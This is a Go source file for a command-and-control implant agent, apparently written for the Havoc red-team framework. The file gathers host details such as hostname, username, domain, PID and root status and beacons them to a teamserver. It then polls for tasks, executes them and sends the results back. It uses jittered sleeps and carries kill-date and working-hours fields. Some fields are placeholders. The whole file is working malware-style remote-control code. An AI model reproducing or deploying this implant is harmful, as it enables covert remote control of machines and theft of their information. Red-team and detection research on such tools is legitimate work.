package agent

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"time"

	"github.com/HavocFramework/GoITDemon/pkg/commands"
	"github.com/HavocFramework/GoITDemon/pkg/transport"
	"github.com/shirou/gopsutil/v3/host"
)

// Agent represents the main IT Demon agent
type Agent struct {
	ID          uint32
	Type        string
	Version     string
	MagicValue  uint32
	Transport   transport.Transport
	CmdHandler  *commands.Handler
	SleepTime   int // milliseconds
	Jitter      int // percentage
	Connected   bool
	Metadata    []byte
}

// Initialize sets up the agent and prepares metadata
func (a *Agent) Initialize() error {
	fmt.Println("[+] Initializing IT Demon agent...")

	// Generate metadata
	metadata, err := a.generateMetadata()
	if err != nil {
		return fmt.Errorf("failed to generate metadata: %v", err)
	}
	a.Metadata = metadata

	fmt.Printf("[+] Metadata generated (%d bytes)\n", len(metadata))
	return nil
}

// Run starts the main agent loop
func (a *Agent) Run() {
	for {
		if !a.Connected {
			fmt.Println("[*] Attempting to connect to teamserver...")
			if err := a.connect(); err != nil {
				fmt.Printf("[-] Connection failed: %v\n", err)
				a.sleep()
				continue
			}
			a.Connected = true
			fmt.Println("[+] Connected to teamserver")
		}

		// Request tasks from teamserver
		tasks, err := a.requestTasks()
		if err != nil {
			fmt.Printf("[-] Failed to request tasks: %v\n", err)
			a.Connected = false
			a.sleep()
			continue
		}

		// Process tasks
		for _, task := range tasks {
			a.processTask(task)
		}

		a.sleep()
	}
}

// connect establishes connection with the teamserver
func (a *Agent) connect() error {
	// Send initial checkin with metadata
	response, err := a.Transport.Send(a.Metadata)
	if err != nil {
		return err
	}

	// Process initial response
	if len(response) > 0 {
		fmt.Printf("[+] Received initial response (%d bytes)\n", len(response))
	}

	return nil
}

// requestTasks gets pending tasks from the teamserver
func (a *Agent) requestTasks() ([]Task, error) {
	// Create task request packet
	request := make([]byte, 4)
	binary.LittleEndian.PutUint32(request, a.ID)

	response, err := a.Transport.Send(request)
	if err != nil {
		return nil, err
	}

	if len(response) == 0 {
		return []Task{}, nil
	}

	// Parse tasks from response
	return a.parseTasks(response)
}

// Task represents a command task from the teamserver
type Task struct {
	ID      uint32
	Command uint32
	Data    []byte
}

// parseTasks parses task data from teamserver response
func (a *Agent) parseTasks(data []byte) ([]Task, error) {
	var tasks []Task
	reader := bytes.NewReader(data)

	for reader.Len() > 0 {
		var task Task
		
		// Read task ID
		if err := binary.Read(reader, binary.LittleEndian, &task.ID); err != nil {
			break
		}
		
		// Read command ID
		if err := binary.Read(reader, binary.LittleEndian, &task.Command); err != nil {
			break
		}
		
		// Read data length
		var dataLen uint32
		if err := binary.Read(reader, binary.LittleEndian, &dataLen); err != nil {
			break
		}
		
		// Read task data
		if dataLen > 0 {
			task.Data = make([]byte, dataLen)
			if _, err := reader.Read(task.Data); err != nil {
				break
			}
		}
		
		tasks = append(tasks, task)
	}

	return tasks, nil
}

// processTask executes a task and sends the result back
func (a *Agent) processTask(task Task) {
	fmt.Printf("[*] Processing task %d with command %d\n", task.ID, task.Command)

	// Execute command
	result, err := a.CmdHandler.Execute(task.Command, task.Data)
	if err != nil {
		fmt.Printf("[-] Task execution failed: %v\n", err)
		result = []byte(fmt.Sprintf("ERROR: %v", err))
	}

	// Send result back to teamserver
	response := a.formatTaskResponse(task.ID, result)
	if _, err := a.Transport.Send(response); err != nil {
		fmt.Printf("[-] Failed to send task response: %v\n", err)
	}
}

// formatTaskResponse creates a response packet for a completed task
func (a *Agent) formatTaskResponse(taskID uint32, data []byte) []byte {
	buf := new(bytes.Buffer)
	
	// Write task ID
	binary.Write(buf, binary.LittleEndian, taskID)
	
	// Write data length
	binary.Write(buf, binary.LittleEndian, uint32(len(data)))
	
	// Write data
	buf.Write(data)
	
	return buf.Bytes()
}

// generateMetadata creates the initial metadata packet
func (a *Agent) generateMetadata() ([]byte, error) {
	buf := new(bytes.Buffer)

	// Write magic value
	binary.Write(buf, binary.LittleEndian, a.MagicValue)

	// Write agent ID
	binary.Write(buf, binary.LittleEndian, a.ID)

	// Get hostname
	hostname, _ := os.Hostname()
	a.writeString(buf, hostname)

	// Get username
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	a.writeString(buf, username)

	// Get domain (for Windows) or empty string
	domain := ""
	if runtime.GOOS == "windows" {
		domain = os.Getenv("USERDOMAIN")
	}
	a.writeString(buf, domain)

	// Get IP address (simplified)
	a.writeString(buf, "127.0.0.1") // TODO: Get actual IP

	// Get process info
	pid := os.Getpid()
	binary.Write(buf, binary.LittleEndian, uint32(pid))

	// Get parent PID (simplified)
	binary.Write(buf, binary.LittleEndian, uint32(1)) // TODO: Get actual PPID

	// Architecture
	arch := runtime.GOARCH
	archCode := uint32(0)
	if arch == "amd64" {
		archCode = 9 // PROCESSOR_ARCHITECTURE_AMD64
	} else if arch == "386" {
		archCode = 0 // PROCESSOR_ARCHITECTURE_INTEL
	}
	binary.Write(buf, binary.LittleEndian, archCode)

	// Admin/root status
	isAdmin := uint32(0)
	if os.Geteuid() == 0 { // Unix root check
		isAdmin = 1
	}
	binary.Write(buf, binary.LittleEndian, isAdmin)

	// Process base address (placeholder)
	binary.Write(buf, binary.LittleEndian, uint64(0))

	// OS Version info
	hostInfo, _ := host.Info()
	if hostInfo != nil {
		// Use actual host info when available
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Major version
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Minor version
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Product type
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Service pack
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Build number
	} else {
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Major version
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Minor version
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Product type
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Service pack
		binary.Write(buf, binary.LittleEndian, uint32(0)) // Build number
	}

	// OS Architecture
	binary.Write(buf, binary.LittleEndian, archCode)

	// Sleep configuration
	binary.Write(buf, binary.LittleEndian, uint32(a.SleepTime))
	binary.Write(buf, binary.LittleEndian, uint32(a.Jitter))

	// Kill date (0 = never)
	binary.Write(buf, binary.LittleEndian, uint64(0))

	// Working hours (0 = always)
	binary.Write(buf, binary.LittleEndian, uint32(0))

	// Add IT-specific metadata
	a.writeITMetadata(buf)

	return buf.Bytes(), nil
}

// writeString writes a length-prefixed string to the buffer
func (a *Agent) writeString(buf *bytes.Buffer, s string) {
	data := []byte(s)
	binary.Write(buf, binary.LittleEndian, uint32(len(data)))
	buf.Write(data)
}

// writeITMetadata adds IT-specific information to the metadata
func (a *Agent) writeITMetadata(buf *bytes.Buffer) {
	// Add OS type
	a.writeString(buf, runtime.GOOS)

	// Add agent type and version
	a.writeString(buf, a.Type)
	a.writeString(buf, a.Version)

	// Add uptime
	if hostInfo, err := host.Info(); err == nil {
		binary.Write(buf, binary.LittleEndian, hostInfo.Uptime)
	} else {
		binary.Write(buf, binary.LittleEndian, uint64(0))
	}
}

// sleep implements the agent sleep with jitter
func (a *Agent) sleep() {
	sleepTime := a.SleepTime
	
	if a.Jitter > 0 {
		jitterMs := (sleepTime * a.Jitter) / 100
		if jitterMs > 0 {
			// Add random jitter
			sleepTime += (int(time.Now().UnixNano()) % jitterMs)
		}
	}

	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
}